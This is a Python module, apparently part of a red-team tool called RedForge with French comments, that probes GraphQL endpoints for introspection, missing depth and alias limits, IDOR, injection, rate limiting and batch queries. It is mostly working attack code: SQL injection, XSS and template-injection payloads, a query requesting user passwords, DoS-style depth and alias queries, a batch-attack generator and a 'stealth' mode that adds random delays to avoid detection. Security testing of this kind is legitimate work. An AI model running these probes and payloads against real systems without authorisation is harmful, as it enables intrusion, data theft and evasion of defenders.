#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'attaques GraphQL pour RedForge
Détection et exploitation des vulnérabilités GraphQL
Version: 2.0.0 - Support Multi-Attaque, Stealth & APT
"""

import re
import json
import time
import random
import requests
from typing import Dict, Any, List, Optional, Tuple
from urllib.parse import urlparse
from dataclasses import dataclass, field

from src.utils.color_output import console


@dataclass
class GraphQLConfig:
    """Configuration des attaques GraphQL"""
    stealth_mode: bool = False
    aggressive_mode: bool = False
    timeout: int = 10
    delay_min: float = 0.5
    delay_max: float = 2.0
    max_depth: int = 10
    max_aliases: int = 50


class GraphQLAttacks:
    """Attaques sur les API GraphQL avec support stealth et APT"""
    
    def __init__(self):
        self.config = GraphQLConfig()
        
        self.introspection_query = """
        query {
            __schema {
                types {
                    name
                    kind
                    description
                    fields {
                        name
                        type {
                            name
                            kind
                        }
                    }
                }
            }
        }
        """
        
        # Queries dangereuses
        self.dangerous_queries = [
            "{__typename}",
            "{__schema{types{name,fields{name}}}}",
            "query{__type(name:\"User\"){name,fields{name}}}",
            "{users{id,email,password}}",
            "{__schema{queryType{fields{name}}}}",
            "{__schema{mutationType{fields{name}}}}",
            "{__schema{subscriptionType{fields{name}}}}"
        ]
        
        # Queries de profondeur
        self.depth_queries = [
            "query { user { friends { friends { friends { name } } } } }",
            "query { user { posts { comments { user { posts { title } } } } } }",
            "query { user { friends { posts { comments { user { name } } } } } }"
        ]
        
        # Queries d'alias
        self.alias_queries = [
            "query { user1: user(id:1) { name }, user2: user(id:2) { name } }",
            "query { a:user(id:1) { name }, b:user(id:2) { name }, c:user(id:3) { name } }"
        ]
        
        # Queries furtives (stealth)
        self.stealth_queries = [
            "{__typename}",
            "{__schema{types{name}}}",
            "{__type(name:\"Query\"){fields{name}}}"
        ]
        
        # Queries APT
        self.apt_queries = [
            "{__schema{types{name,fields{name,type{name}}}}}",
            "{__schema{mutationType{fields{name,args{name,type{name}}}}}}",
            "query{__type(name:\"User\"){name,fields{name,type{name}}}}"
        ]
    
    def set_stealth_mode(self, enabled: bool = True):
        """Active le mode furtif"""
        self.config.stealth_mode = enabled
        console.print_info(f"🕵️ Mode furtif {'activé' if enabled else 'désactivé'} pour GraphQL")
    
    def set_aggressive_mode(self, enabled: bool = True):
        """Active le mode agressif"""
        self.config.aggressive_mode = enabled
        console.print_info(f"⚡ Mode agressif {'activé' if enabled else 'désactivé'} pour GraphQL")
    
    def _random_delay(self):
        """Ajoute un délai aléatoire pour le mode furtif"""
        if self.config.stealth_mode:
            delay = random.uniform(self.config.delay_min, self.config.delay_max)
            time.sleep(delay)
    
    def _get_queries(self) -> List[str]:
        """Retourne les requêtes selon le mode"""
        if self.config.stealth_mode:
            return self.stealth_queries
        elif self.config.aggressive_mode:
            return self.dangerous_queries + self.depth_queries + self.alias_queries + self.apt_queries
        return self.dangerous_queries + self.depth_queries + self.alias_queries
    
    def scan(self, endpoint: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités GraphQL
        
        Args:
            endpoint: URL de l'endpoint GraphQL
            **kwargs:
                - headers: Headers personnalisés
                - auth_token: Token d'authentification
                - stealth: Mode furtif
                - aggressive: Mode agressif
        """
        console.print_info("📊 Test des attaques GraphQL")
        
        # Appliquer les modes
        if kwargs.get('stealth'):
            self.set_stealth_mode(True)
        if kwargs.get('aggressive'):
            self.set_aggressive_mode(True)
        
        vulnerabilities = []
        headers = kwargs.get('headers', {})
        
        if kwargs.get('auth_token'):
            headers['Authorization'] = f"Bearer {kwargs['auth_token']}"
        
        # Test introspection
        introspection_result = self._test_introspection(endpoint, headers)
        if introspection_result['enabled']:
            vulnerabilities.append({
                "type": "introspection_enabled",
                "severity": "MEDIUM",
                "details": "Introspection GraphQL activée",
                "schema_preview": introspection_result.get('schema_preview', '')
            })
            console.print_warning(f"      ✓ Introspection activée")
        
        # Test field duplication
        duplication_vulns = self._test_field_duplication(endpoint, headers)
        vulnerabilities.extend(duplication_vulns)
        
        # Test depth limit
        depth_vulns = self._test_depth_limit(endpoint, headers)
        vulnerabilities.extend(depth_vulns)
        
        # Test alias limit
        alias_vulns = self._test_alias_limit(endpoint, headers)
        vulnerabilities.extend(alias_vulns)
        
        # Test IDOR
        idor_vulns = self._test_graphql_idor(endpoint, headers)
        vulnerabilities.extend(idor_vulns)
        
        # Test injection
        injection_vulns = self._test_graphql_injection(endpoint, headers)
        vulnerabilities.extend(injection_vulns)
        
        # Test rate limiting (stealth)
        if self.config.stealth_mode:
            rate_vulns = self._test_rate_limiting(endpoint, headers)
            vulnerabilities.extend(rate_vulns)
        
        # Test batch queries (aggressive)
        if self.config.aggressive_mode:
            batch_vulns = self._test_batch_queries(endpoint, headers)
            vulnerabilities.extend(batch_vulns)
        
        return {
            "endpoint": endpoint,
            "stealth_mode": self.config.stealth_mode,
            "aggressive_mode": self.config.aggressive_mode,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "summary": self._generate_summary(vulnerabilities)
        }
    
    def _test_introspection(self, endpoint: str, 
                           headers: Dict) -> Dict[str, Any]:
        """Teste si l'introspection GraphQL est activée"""
        result = {
            "enabled": False,
            "schema_preview": None
        }
        
        try:
            response = requests.post(endpoint, json={'query': self.introspection_query},
                                    headers=headers, timeout=self.config.timeout, 
                                    verify=False)
            self._random_delay()
            
            if response.status_code == 200:
                data = response.json()
                if '__schema' in data.get('data', {}):
                    result["enabled"] = True
                    # Limiter l'aperçu du schéma
                    schema_types = data['data']['__schema']['types'][:10]
                    result["schema_preview"] = json.dumps(schema_types, indent=2)
                    
        except Exception as e:
            console.print_warning(f"Erreur introspection: {e}")
        
        return result
    
    def _test_field_duplication(self, endpoint: str, 
                                headers: Dict) -> List[Dict[str, Any]]:
        """Teste la duplication de champs"""
        vulnerabilities = []
        
        test_query = """
        query {
            user(id: 1) {
                name
                name
                email
                email
            }
        }
        """
        
        try:
            response = requests.post(endpoint, json={'query': test_query},
                                    headers=headers, timeout=self.config.timeout, 
                                    verify=False)
            self._random_delay()
            
            if response.status_code == 200:
                vulnerabilities.append({
                    "type": "field_duplication",
                    "severity": "LOW",
                    "details": "Duplication de champs acceptée"
                })
                
        except Exception:
            pass
        
        return vulnerabilities
    
    def _test_depth_limit(self, endpoint: str, 
                          headers: Dict) -> List[Dict[str, Any]]:
        """Teste la limite de profondeur GraphQL"""
        vulnerabilities = []
        queries = self.depth_queries[:self.config.max_depth]
        
        for query in queries:
            try:
                response = requests.post(endpoint, json={'query': query},
                                        headers=headers, timeout=self.config.timeout, 
                                        verify=False)
                self._random_delay()
                
                if response.status_code == 200:
                    vulnerabilities.append({
                        "type": "depth_limit_missing",
                        "severity": "MEDIUM",
                        "details": "Absence de limite de profondeur"
                    })
                    console.print_warning(f"      ✓ Profondeur non limitée")
                    break
                    
            except Exception:
                continue
        
        return vulnerabilities
    
    def _test_alias_limit(self, endpoint: str, 
                          headers: Dict) -> List[Dict[str, Any]]:
        """Teste la limite d'alias GraphQL"""
        vulnerabilities = []
        
        alias_count = self.config.max_aliases if self.config.aggressive_mode else 50
        alias_query = "query { " + ", ".join([f"a{i}: __typename" for i in range(alias_count)]) + " }"
        
        try:
            response = requests.post(endpoint, json={'query': alias_query},
                                    headers=headers, timeout=30, verify=False)
            self._random_delay()
            
            if response.status_code == 200:
                vulnerabilities.append({
                    "type": "alias_limit_missing",
                    "severity": "MEDIUM",
                    "details": f"Absence de limite d'alias ({alias_count} alias acceptés)"
                })
                console.print_warning(f"      ✓ Limite d'alias manquante")
                
        except Exception:
            pass
        
        return vulnerabilities
    
    def _test_graphql_idor(self, endpoint: str, 
                           headers: Dict) -> List[Dict[str, Any]]:
        """Teste les IDOR dans GraphQL"""
        vulnerabilities = []
        
        idor_queries = [
            "{ user(id: 1) { email } }",
            "{ user(id: 2) { email } }",
            "{ user(id: 0) { email } }",
            "{ user(id: 9999) { email } }",
            "{ user(id: \"admin\") { email } }",
            "{ user(id: \"1' OR '1'='1\") { email } }"
        ]
        
        responses = []
        for query in idor_queries:
            try:
                response = requests.post(endpoint, json={'query': query},
                                        headers=headers, timeout=self.config.timeout, 
                                        verify=False)
                self._random_delay()
                
                if response.status_code == 200:
                    data = response.json()
                    if 'data' in data and data['data']:
                        responses.append(str(data['data']))
                        
            except Exception:
                continue
        
        # Vérifier si différentes réponses sont obtenues
        if len(set(responses)) > 1:
            vulnerabilities.append({
                "type": "graphql_idor",
                "severity": "HIGH",
                "details": "IDOR possible - différentes réponses pour différents IDs"
            })
            console.print_warning(f"      ✓ IDOR GraphQL détecté")
        
        return vulnerabilities
    
    def _test_graphql_injection(self, endpoint: str, 
                                headers: Dict) -> List[Dict[str, Any]]:
        """Teste les injections dans GraphQL"""
        vulnerabilities = []
        
        injection_queries = [
            "{ user(id: \"1' OR '1'='1\") { name } }",
            "{ user(id: \"1\\\") { name } }",
            "{ user(id: \"<script>alert('XSS')</script>\") { name } }",
            "{ user(id: \"${7*7}\") { name } }",
            "{ user(id: \"{{7*7}}\") { name } }"
        ]
        
        for query in injection_queries:
            try:
                response = requests.post(endpoint, json={'query': query},
                                        headers=headers, timeout=self.config.timeout, 
                                        verify=False)
                self._random_delay()
                
                error_indicators = [
                    'syntax error', 'unexpected', 'invalid', 'exception',
                    'SQL', 'mysql', 'postgresql', 'mongo', 'parse error',
                    'validation error', 'cannot query field'
                ]
                
                for indicator in error_indicators:
                    if indicator in response.text.lower():
                        vulnerabilities.append({
                            "type": "graphql_injection",
                            "severity": "HIGH",
                            "details": f"Injection possible: {indicator}"
                        })
                        console.print_warning(f"      ✓ Injection GraphQL détectée")
                        break
                
                if vulnerabilities:
                    break
                    
            except Exception:
                continue
        
        return vulnerabilities
    
    def _test_rate_limiting(self, endpoint: str, 
                            headers: Dict) -> List[Dict[str, Any]]:
        """Teste le rate limiting GraphQL"""
        vulnerabilities = []
        
        test_query = "{ __typename }"
        success_count = 0
        request_count = 30
        
        console.print_info(f"      Test rate limiting GraphQL...")
        
        for i in range(request_count):
            try:
                response = requests.post(endpoint, json={'query': test_query},
                                        headers=headers, timeout=5, verify=False)
                if response.status_code == 200:
                    success_count += 1
                time.sleep(0.1)
            except:
                pass
        
        if success_count > request_count * 0.7:
            vulnerabilities.append({
                "type": "missing_rate_limit",
                "severity": "MEDIUM",
                "details": f"Absence de rate limiting: {success_count}/{request_count} requêtes réussies"
            })
            console.print_warning(f"      ✓ Rate limiting manquant")
        
        return vulnerabilities
    
    def _test_batch_queries(self, endpoint: str, 
                            headers: Dict) -> List[Dict[str, Any]]:
        """Teste les requêtes batch GraphQL"""
        vulnerabilities = []
        
        batch_query = [
            {"query": "{ __typename }"},
            {"query": "{ __schema { types { name } } }"},
            {"query": "{ user(id: 1) { name } }"}
        ]
        
        try:
            response = requests.post(endpoint, json=batch_query,
                                    headers=headers, timeout=self.config.timeout, 
                                    verify=False)
            
            if response.status_code == 200 and len(response.json()) > 1:
                vulnerabilities.append({
                    "type": "batch_query_enabled",
                    "severity": "MEDIUM",
                    "details": "Requêtes batch acceptées - risque de DoS"
                })
                console.print_warning(f"      ✓ Batch queries acceptées")
                
        except Exception:
            pass
        
        return vulnerabilities
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        return {
            "total": len(vulnerabilities),
            "stealth_mode": self.config.stealth_mode,
            "aggressive_mode": self.config.aggressive_mode,
            "by_type": {
                "introspection": len([v for v in vulnerabilities if v['type'] == 'introspection_enabled']),
                "idor": len([v for v in vulnerabilities if v['type'] == 'graphql_idor']),
                "injection": len([v for v in vulnerabilities if v['type'] == 'graphql_injection']),
                "depth_limit": len([v for v in vulnerabilities if v['type'] == 'depth_limit_missing']),
                "alias_limit": len([v for v in vulnerabilities if v['type'] == 'alias_limit_missing']),
                "rate_limit": len([v for v in vulnerabilities if v['type'] == 'missing_rate_limit']),
                "batch": len([v for v in vulnerabilities if v['type'] == 'batch_query_enabled'])
            },
            "critical": len([v for v in vulnerabilities if v['severity'] == 'CRITICAL']),
            "high": len([v for v in vulnerabilities if v['severity'] == 'HIGH']),
            "medium": len([v for v in vulnerabilities if v['severity'] == 'MEDIUM'])
        }
    
    def extract_schema(self, endpoint: str, headers: Dict = None) -> Dict[str, Any]:
        """
        Extrait le schéma GraphQL complet
        
        Args:
            endpoint: Endpoint GraphQL
            headers: Headers HTTP
        """
        if headers is None:
            headers = {}
        
        try:
            response = requests.post(endpoint, json={'query': self.introspection_query},
                                    headers=headers, timeout=30, verify=False)
            
            if response.status_code == 200:
                return response.json()
                
        except Exception as e:
            return {"error": str(e)}
        
        return {}
    
    def generate_batch_attack(self, endpoint: str, queries: List[str]) -> Dict[str, Any]:
        """
        Génère une attaque par batch queries
        
        Args:
            endpoint: Endpoint GraphQL
            queries: Liste des requêtes à exécuter en batch
        """
        batch_payload = [{"query": q} for q in queries]
        
        try:
            response = requests.post(endpoint, json=batch_payload, timeout=30, verify=False)
            return {
                "success": response.status_code == 200,
                "responses": response.json() if response.status_code == 200 else [],
                "count": len(batch_payload)
            }
        except Exception as e:
            return {"success": False, "error": str(e)}


# Point d'entrée pour tests
if __name__ == "__main__":
    gql = GraphQLAttacks()
    
    # Test mode standard
    print("=== Mode Standard ===")
    results = gql.scan("https://example.com/graphql")
    print(f"Vulnérabilités GraphQL: {results['count']}")
    
    # Test mode furtif
    print("\n=== Mode Furtif ===")
    gql.set_stealth_mode(True)
    results = gql.scan("https://example.com/graphql")
    print(f"Vulnérabilités GraphQL (stealth): {results['count']}")
    
    # Test mode agressif
    print("\n=== Mode Agressif ===")
    gql.set_aggressive_mode(True)
    results = gql.scan("https://example.com/graphql")
    print(f"Vulnérabilités GraphQL (aggressive): {results['count']}")